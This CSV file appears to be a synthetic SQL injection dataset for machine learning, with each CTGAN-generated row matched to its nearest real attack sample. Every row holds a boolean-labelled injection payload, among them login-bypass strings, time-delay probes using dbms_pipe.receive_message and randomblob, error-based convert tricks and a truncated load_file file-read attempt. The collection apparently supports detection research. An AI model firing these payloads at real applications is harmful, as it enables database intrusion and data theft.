id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000022,attack,boolean,"-2722""  )   or 4907  =  8126#",nearest_attack_euclidean,R000145,4.585777126644096
CTGAN_000023,attack,boolean,-2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838,nearest_attack_euclidean,R000286,8.046814205588019
CTGAN_000024,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000013,4.320282975839885
CTGAN_000025,attack,boolean,1' and   (  3435  =  7210  )  *7210 and 'lxxt'  =  'lxxt,nearest_attack_euclidean,R000228,5.258555182741501
CTGAN_000026,attack,boolean,"-9721' or elt  (  9511  =  9238,9238  )  ",nearest_attack_euclidean,R000186,6.563538702951348
CTGAN_000027,attack,boolean,"x' and members.email is NULL, --",nearest_attack_euclidean,R000025,6.033104966488593
CTGAN_000028,attack,boolean,  )   or true--,nearest_attack_euclidean,R000033,6.482622637690451
CTGAN_000029,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000013,5.923612621115891
CTGAN_000030,attack,boolean,1 and   (  1977  =  6852  )  *6852-- clxl,nearest_attack_euclidean,R000233,5.561863125619665
CTGAN_000031,attack,boolean,"-3109"" or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R000203,9.375131843439949
CTGAN_000032,attack,boolean,1' and 6621  =  4681--,nearest_attack_euclidean,R000260,6.6191380197608956
CTGAN_000033,attack,boolean,"1 and make_set  (  6911  =  1867,1867  )  ",nearest_attack_euclidean,R000247,3.498721683356292
CTGAN_000034,attack,boolean,1 and   (  1977  =  6852  )  *6852-- clxl,nearest_attack_euclidean,R000233,3.526102521137395
CTGAN_000035,attack,boolean,-7497'  )   as kjzt where 3758  =  3758 or 4794  =  9499--,nearest_attack_euclidean,R000152,6.611980081503705
CTGAN_000036,attack,boolean,1 and   (  5369  =  8325  )  *8325# psze,nearest_attack_euclidean,R000201,5.857108024613648
CTGAN_000037,attack,boolean,or '1'  =  '1'--,nearest_attack_euclidean,R000038,10.362234000622522
CTGAN_000038,attack,boolean,"-9996' or make_set  (  1237  =  7111,7111  )  ",nearest_attack_euclidean,R000111,5.25931872745352
CTGAN_000039,attack,boolean,"1 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000304,10.58043156388722
CTGAN_000040,attack,boolean,or 1  =  1/*,nearest_attack_euclidean,R000004,6.077004653807994
CTGAN_000041,attack,boolean,or '1'  =  '1'--,nearest_attack_euclidean,R000038,11.045077560904176
CTGAN_000042,attack,boolean,"-9676 or elt  (  1032  =  1032,3623  )  # jcaq",nearest_attack_euclidean,R000183,4.768997043724013
CTGAN_000043,attack,boolean,-6218'   )    )    or 2236  =  4469#,nearest_attack_euclidean,R000086,5.614923579909992
CTGAN_000044,attack,boolean,1'||  (  select 'awba' from dual where 3749  =  3749 and 1445  =  3334--,nearest_attack_euclidean,R000264,7.345072465615338
CTGAN_000045,attack,boolean,"1' in boolean mode  )   and make_set  (  7804  =  3315,3315  )  #",nearest_attack_euclidean,R000071,5.941783639739755
CTGAN_000046,attack,boolean,end and    (    (   'vcaf' like 'vcaf,nearest_attack_euclidean,R000156,7.507056557173087
CTGAN_000047,attack,boolean,or 'text'   =   n'text',nearest_attack_euclidean,R000032,4.270975798890948
CTGAN_000048,attack,boolean,"-5417 or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R000083,4.013809097196572
CTGAN_000049,attack,boolean,1' and 1661  =  1244 and 'dcha'  =  'dcha,nearest_attack_euclidean,R000133,6.148208121817374
CTGAN_000050,attack,boolean,1 and   (  1977  =  6852  )  *6852-- clxl,nearest_attack_euclidean,R000233,6.4996133913905
CTGAN_000051,attack,boolean,-9389'  )   or 8859  =  3989--,nearest_attack_euclidean,R000214,5.893674672812025
CTGAN_000052,attack,boolean,-6081 where 3681  =  3681 or 2603  =  3138--,nearest_attack_euclidean,R000165,5.20109209427357
CTGAN_000053,attack,boolean,"-2548""   )    )     )   or 5107  =  8049--",nearest_attack_euclidean,R000055,5.972768995162309
CTGAN_000054,attack,boolean,"-7236 or make_set  (  9618  =  6919,6919  )  ",nearest_attack_euclidean,R000256,6.397112041740416
CTGAN_000055,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000031,9.058718923172457
CTGAN_000056,attack,boolean,-6218'   )    )    or 2236  =  4469#,nearest_attack_euclidean,R000086,6.0189786039236495
CTGAN_000057,attack,boolean,"1""  )   and make_set  (  4539  =  6401,6401  )   and   (  ""kglx""  =  ""kglx",nearest_attack_euclidean,R000100,8.627827932037036
CTGAN_000058,attack,boolean,"1' and make_set  (  9860  =  6956,6956  )   and 'toru'  =  'toru",nearest_attack_euclidean,R000311,8.007585481938294
CTGAN_000059,attack,boolean,"1 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000304,12.591020990556343
CTGAN_000060,attack,boolean,"1 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000304,10.334490709518615
CTGAN_000061,attack,boolean,"1' in boolean mode  )   and make_set  (  7804  =  3315,3315  )  #",nearest_attack_euclidean,R000071,5.837276553785858
CTGAN_000062,attack,boolean,-9389'  )   or 8859  =  3989--,nearest_attack_euclidean,R000214,5.684658637004924
CTGAN_000063,attack,boolean,"admin"" or ""1""  =  ""1""--",nearest_attack_euclidean,R000002,9.113167096886878
CTGAN_000064,attack,boolean,"1"" and 1668  =  8288",nearest_attack_euclidean,R000072,4.1797890874200965
CTGAN_000065,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""ewsr"" like ""ewsr",nearest_attack_euclidean,R000132,8.031030397336398
CTGAN_000066,attack,boolean,"1 and make_set  (  9681  =  4703,4703  )  # zbrf",nearest_attack_euclidean,R000166,5.663235291657499
CTGAN_000067,attack,boolean,  )   or true--,nearest_attack_euclidean,R000033,5.692614909246319
CTGAN_000068,attack,boolean,1' and 1661  =  1244 and 'dcha'  =  'dcha,nearest_attack_euclidean,R000133,4.704654443579356
CTGAN_000069,attack,boolean,"-9721' or elt  (  9511  =  9238,9238  )  ",nearest_attack_euclidean,R000186,10.437371152946227
CTGAN_000070,attack,boolean,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",nearest_attack_euclidean,R000205,7.342760027169602
CTGAN_000071,attack,boolean,or '1'  =  '1'--,nearest_attack_euclidean,R000038,14.415380754787126
CTGAN_000072,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000009,4.456039017493978
CTGAN_000073,attack,boolean,"1' and elt  (  2266  =  7467,7467  )  ",nearest_attack_euclidean,R000211,5.381912084163929
CTGAN_000074,attack,boolean,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",nearest_attack_euclidean,R000205,5.422779003461899
CTGAN_000075,attack,boolean,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  # dbzk",nearest_attack_euclidean,R000270,8.053784097390505
CTGAN_000076,attack,boolean,or x  =  x,nearest_attack_euclidean,R000021,5.167074804405866
CTGAN_000077,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000031,6.5571245840198475
CTGAN_000078,attack,boolean,"-9996' or make_set  (  1237  =  7111,7111  )  ",nearest_attack_euclidean,R000111,5.398435746837106
CTGAN_000079,attack,boolean,"1' and make_set  (  9860  =  6956,6956  )   and 'toru'  =  'toru",nearest_attack_euclidean,R000311,4.545068540347221
CTGAN_000080,attack,boolean,"-7551 or elt  (  6900  =  7195,7195  )  ",nearest_attack_euclidean,R000195,6.7461973539161955
CTGAN_000081,attack,boolean,1' in boolean mode  )   and 3787  =  7750--,nearest_attack_euclidean,R000254,6.636602209632416
CTGAN_000082,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000011,7.002435653777273
CTGAN_000083,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  ",nearest_attack_euclidean,R000210,3.567644955788879
CTGAN_000084,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'cpoy'  =  'cpoy",nearest_attack_euclidean,R000281,8.893588568881508
CTGAN_000085,attack,boolean,"-8344 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- wjpa",nearest_attack_euclidean,R000289,13.758538206533823
CTGAN_000086,attack,boolean,1'+  (  select 'ohdf' where 7878  =  7878 and 5678  =  3277--,nearest_attack_euclidean,R000164,8.948624555370321
CTGAN_000087,attack,boolean,"-9721' or elt  (  9511  =  9238,9238  )  ",nearest_attack_euclidean,R000186,6.9836229457359
CTGAN_000088,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000031,5.616062862583796
CTGAN_000089,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000013,3.8388855608637145
CTGAN_000090,attack,boolean,1'  )   and   (  2763  =  4004  )  *4004 and   (  'dtts'  =  'dtts,nearest_attack_euclidean,R000276,7.920185346745822
CTGAN_000091,attack,boolean,1 and   (  1977  =  6852  )  *6852-- clxl,nearest_attack_euclidean,R000233,7.330135717584454
CTGAN_000092,attack,boolean,"1%' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000135,6.930159216346451
CTGAN_000093,attack,boolean,"1' and elt  (  2266  =  7467,7467  )  ",nearest_attack_euclidean,R000211,4.059491580243566
CTGAN_000094,attack,boolean,"1 and make_set  (  9681  =  4703,4703  )  # zbrf",nearest_attack_euclidean,R000166,5.588894032797328
CTGAN_000095,attack,boolean,"1 and make_set  (  6911  =  1867,1867  )  ",nearest_attack_euclidean,R000247,5.564004025890691
CTGAN_000096,attack,boolean,1'+  (  select 'ohdf' where 7878  =  7878 and 5678  =  3277--,nearest_attack_euclidean,R000164,9.383207759687188
CTGAN_000097,attack,boolean,-5113'   )    )     )   or 7200  =  3094--,nearest_attack_euclidean,R000279,4.128022061374207
CTGAN_000098,attack,boolean,"-4945 or make_set  (  9354  =  9354,7185  )  ",nearest_attack_euclidean,R000182,6.991382007615961
CTGAN_000099,attack,boolean,end and 'wdce'  =  'wdce,nearest_attack_euclidean,R000275,3.0105223895922486
CTGAN_000100,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000016,5.787012394226516
CTGAN_000101,attack,boolean, and 1  =  0  )   union all,nearest_attack_euclidean,R000044,5.6817212022895625
CTGAN_000102,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000031,9.23402308740739
CTGAN_000103,attack,boolean,anything' OR 'x'  =  'x,nearest_attack_euclidean,R000027,5.265447680594278
CTGAN_000104,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000031,6.4270637411415175
CTGAN_000105,attack,boolean,"1 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000304,11.259741873075626
CTGAN_000106,attack,boolean,1' and 5835  =  6157 and 'bjee' like 'bjee,nearest_attack_euclidean,R000293,3.9748782140446552
CTGAN_000107,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000031,6.893025082398416
CTGAN_000108,attack,boolean,1' and   (  3435  =  7210  )  *7210 and 'lxxt'  =  'lxxt,nearest_attack_euclidean,R000228,6.758924441360843
CTGAN_000109,attack,boolean,or 1 --',nearest_attack_euclidean,R000005,8.09971689255431
CTGAN_000110,attack,boolean,"1"" and 7533  =  7533 and ""dqjp""  =  ""dqjp",nearest_attack_euclidean,R000239,7.538361860631542
CTGAN_000111,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000016,5.734019849606625
CTGAN_000112,attack,boolean,"1' and elt  (  2266  =  7467,7467  )  ",nearest_attack_euclidean,R000211,10.811123176971268
CTGAN_000113,attack,boolean,"-2211"" or 2113  =  8885#",nearest_attack_euclidean,R000292,5.712169382127623
CTGAN_000114,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000031,5.0785611625817655
CTGAN_000115,attack,boolean,1'||  (  select 'awba' from dual where 3749  =  3749 and 1445  =  3334--,nearest_attack_euclidean,R000264,7.146643143850025
CTGAN_000116,attack,boolean,"1 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000304,8.870053839742853
CTGAN_000117,attack,boolean,-5113'   )    )     )   or 7200  =  3094--,nearest_attack_euclidean,R000279,5.203297174493834
CTGAN_000118,attack,boolean,"1' and make_set  (  9860  =  6956,6956  )   and 'toru'  =  'toru",nearest_attack_euclidean,R000311,6.183594719176292
CTGAN_000119,attack,boolean,"-7551 or elt  (  6900  =  7195,7195  )  ",nearest_attack_euclidean,R000195,8.672774028953496
CTGAN_000120,attack,boolean,-8023' or 6872  =  6872,nearest_attack_euclidean,R000224,5.636775483280159
CTGAN_000121,attack,boolean,"-9721' or elt  (  9511  =  9238,9238  )  ",nearest_attack_euclidean,R000186,8.326543010892177
CTGAN_000122,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000011,3.5514020452899273
CTGAN_000123,attack,boolean,"1%"" and 4595  =  4595#",nearest_attack_euclidean,R000148,6.158695948869521
CTGAN_000124,attack,boolean,or '1'  =  '1'--,nearest_attack_euclidean,R000038,10.762126378305563
CTGAN_000125,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R000196,5.3036251353313375
CTGAN_000126,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000043,7.0369879970215115
CTGAN_000127,attack,boolean,"-4550""  )   as hlwe where 6026  =  6026 or   (  9364  =  9593  )  *9593--",nearest_attack_euclidean,R000308,8.904926406158538
CTGAN_000128,attack,boolean, and 1  =  0  )   union all,nearest_attack_euclidean,R000044,4.355976111902983
CTGAN_000129,attack,boolean,"1' in boolean mode  )   and make_set  (  7804  =  3315,3315  )  #",nearest_attack_euclidean,R000071,5.103958507136643
CTGAN_000130,attack,boolean,or '1'  =  '1'--,nearest_attack_euclidean,R000038,10.844897631887227
CTGAN_000131,attack,boolean,1'||  (  select 'awba' from dual where 3749  =  3749 and 1445  =  3334--,nearest_attack_euclidean,R000264,6.133544872289826
CTGAN_000132,attack,boolean,-9178'  )   or 9779  =  6351,nearest_attack_euclidean,R000218,4.2192881951593275
CTGAN_000133,attack,boolean,-9389'  )   or 8859  =  3989--,nearest_attack_euclidean,R000214,5.68911823233064
CTGAN_000134,attack,boolean,"-1048%"" or 3038  =  3038",nearest_attack_euclidean,R000107,5.102425518659003
CTGAN_000135,attack,boolean,-2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838,nearest_attack_euclidean,R000286,8.786743385891906
CTGAN_000136,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000016,3.516172336965532
CTGAN_000137,attack,boolean,end and 'wdce'  =  'wdce,nearest_attack_euclidean,R000275,5.223564992242268
CTGAN_000138,attack,boolean,or '1'  =  '1'--,nearest_attack_euclidean,R000038,6.24099147763116
CTGAN_000139,attack,boolean,"1' in boolean mode  )   and make_set  (  7804  =  3315,3315  )  #",nearest_attack_euclidean,R000071,4.751172504352684
CTGAN_000140,attack,boolean,"-4866""  )   as eyrq where 8365  =  8365 or 1898  =  8320#",nearest_attack_euclidean,R000175,4.006766549787126
CTGAN_000141,attack,boolean,"1"" and 4288  =  3696 and ""qqam"" like ""qqam",nearest_attack_euclidean,R000306,7.183218502981239
CTGAN_000142,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R000261,4.411271777849129
CTGAN_000143,attack,boolean,-9178'  )   or 9779  =  6351,nearest_attack_euclidean,R000218,4.31501947350514
CTGAN_000144,attack,boolean,-8836%'  )   or 4856  =  3891,nearest_attack_euclidean,R000212,7.5343063282675775
CTGAN_000145,attack,boolean, and 1  =  0  )   union all,nearest_attack_euclidean,R000044,3.7048317128542108
CTGAN_000146,attack,boolean,-3849  )   or 5580  =  3442--,nearest_attack_euclidean,R000109,5.307498484245666
CTGAN_000147,attack,boolean,"admin"" or ""1""  =  ""1""--",nearest_attack_euclidean,R000002,6.680554090648158
CTGAN_000148,attack,boolean, or uid like '%,nearest_attack_euclidean,R000018,6.548577559917698
CTGAN_000149,attack,boolean,or '1'  =  '1'--,nearest_attack_euclidean,R000038,10.128941397889323
CTGAN_000150,attack,boolean,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- izad,nearest_attack_euclidean,R000118,7.259646784421039
CTGAN_000151,attack,boolean,"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  # zcyc",nearest_attack_euclidean,R000046,6.510696043156926
CTGAN_000152,attack,boolean,"1' and make_set  (  9860  =  6956,6956  )   and 'toru'  =  'toru",nearest_attack_euclidean,R000311,8.20096572612068
CTGAN_000153,attack,boolean, or userid like '%,nearest_attack_euclidean,R000034,6.328723575019005
CTGAN_000154,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000009,5.215714954723513
CTGAN_000155,attack,boolean," end and    (    (     (  ""zpii"" like ""zpii",nearest_attack_euclidean,R000087,12.309170830004787
CTGAN_000156,attack,boolean,"-5780 or make_set  (  3464  =  4518,4518  )  -- icit",nearest_attack_euclidean,R000108,6.683913928696583
CTGAN_000157,attack,boolean,"1"" and 9468  =  7105--",nearest_attack_euclidean,R000176,8.057011430211778
CTGAN_000158,attack,boolean,end and 'wdce'  =  'wdce,nearest_attack_euclidean,R000275,6.713125782162848
CTGAN_000159,attack,boolean,1'+  (  select 'ohdf' where 7878  =  7878 and 5678  =  3277--,nearest_attack_euclidean,R000164,10.785367025451068
CTGAN_000160,attack,boolean,"-9721' or elt  (  9511  =  9238,9238  )  ",nearest_attack_euclidean,R000186,5.665871716531396
CTGAN_000161,attack,boolean,"-3109"" or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R000203,4.609054723230432
CTGAN_000162,attack,boolean, and 1  =  0  )   union all,nearest_attack_euclidean,R000044,2.986088431933739
CTGAN_000163,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000011,10.093449060172773
CTGAN_000164,attack,boolean,"-9721' or elt  (  9511  =  9238,9238  )  ",nearest_attack_euclidean,R000186,4.573092609721051
CTGAN_000165,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",nearest_attack_euclidean,R000095,12.096106537731078
CTGAN_000166,attack,boolean, or uid like '%,nearest_attack_euclidean,R000018,7.038165845767144
CTGAN_000167,attack,boolean,"1""   )    )    and elt  (  6553  =  4771,4771  )   and    (    (   ""eolu""  =  ""eolu",nearest_attack_euclidean,R000160,5.369758088359045
CTGAN_000168,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000016,6.42171428007726
CTGAN_000169,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000043,9.36293450667368
CTGAN_000170,attack,boolean,-5918'  )   as olzc where 5992  =  5992 or 4390  =  9085,nearest_attack_euclidean,R000050,5.213828735518458
CTGAN_000171,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000009,5.97285286991137
CTGAN_000172,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000013,5.276565827077657
CTGAN_000173,attack,boolean,or '1'  =  '1'--,nearest_attack_euclidean,R000038,8.054888241587063
CTGAN_000174,attack,boolean,or '1'  =  '1'--,nearest_attack_euclidean,R000038,10.586059978792964
CTGAN_000175,attack,boolean,"1"" and 4996  =  4431 and ""jzaq""  =  ""jzaq",nearest_attack_euclidean,R000297,7.157611681587119
CTGAN_000176,attack,boolean,"-4550""  )   as hlwe where 6026  =  6026 or   (  9364  =  9593  )  *9593--",nearest_attack_euclidean,R000308,6.450923204652559
CTGAN_000177,attack,boolean,"-2722""  )   or 4907  =  8126#",nearest_attack_euclidean,R000145,4.048790641008389
CTGAN_000178,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000031,10.052971126496681
CTGAN_000179,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000009,6.354866249100249
CTGAN_000180,attack,boolean,"-9721' or elt  (  9511  =  9238,9238  )  ",nearest_attack_euclidean,R000186,4.688742386642746
CTGAN_000181,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000096,11.750609082751717
CTGAN_000182,attack,boolean,"1 and elt  (  2770  =  3669,3669  )  # sfls",nearest_attack_euclidean,R000137,2.8331390688910014
CTGAN_000183,attack,boolean,"-8344 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- wjpa",nearest_attack_euclidean,R000289,11.062972426059442
CTGAN_000184,attack,boolean,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  # dbzk",nearest_attack_euclidean,R000270,6.431861273927808
CTGAN_000185,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000013,4.629722987666901
CTGAN_000186,attack,boolean,1'  )   and   (  2763  =  4004  )  *4004 and   (  'dtts'  =  'dtts,nearest_attack_euclidean,R000276,10.81362474895452
CTGAN_000187,attack,boolean,1'  )   and   (  2763  =  4004  )  *4004 and   (  'dtts'  =  'dtts,nearest_attack_euclidean,R000276,7.430506713893272
CTGAN_000188,attack,boolean,"1""  )   and   (  4085  =  4885  )  *4885 and   (  ""sxte""  =  ""sxte",nearest_attack_euclidean,R000242,5.1111882481672355
CTGAN_000189,attack,boolean, and 1  =  0  )   union all,nearest_attack_euclidean,R000044,5.009301958379319
CTGAN_000190,attack,boolean,-2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838,nearest_attack_euclidean,R000286,7.99714857484257
CTGAN_000191,attack,boolean,"1' and elt  (  2266  =  7467,7467  )  ",nearest_attack_euclidean,R000211,4.492123192241092
CTGAN_000192,attack,boolean,end and 'wdce'  =  'wdce,nearest_attack_euclidean,R000275,4.757539988837044
CTGAN_000193,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""ejmj"" like ""ejmj",nearest_attack_euclidean,R000192,4.823086341865524
CTGAN_000194,attack,boolean,-7941 or   (  5822  =  8754  )  *8754-- eepn,nearest_attack_euclidean,R000062,4.509202794342663
CTGAN_000195,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000031,6.824064179043332
CTGAN_000196,attack,boolean,"1' and elt  (  2266  =  7467,7467  )  ",nearest_attack_euclidean,R000211,6.403788500789997
CTGAN_000197,attack,boolean,"1 and make_set  (  6911  =  1867,1867  )  ",nearest_attack_euclidean,R000247,7.818207693810071
CTGAN_000198,attack,boolean,-4828%'  )   or 8678  =  5745#,nearest_attack_euclidean,R000147,5.977013757065012
CTGAN_000199,attack,boolean,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",nearest_attack_euclidean,R000205,7.627233655218537
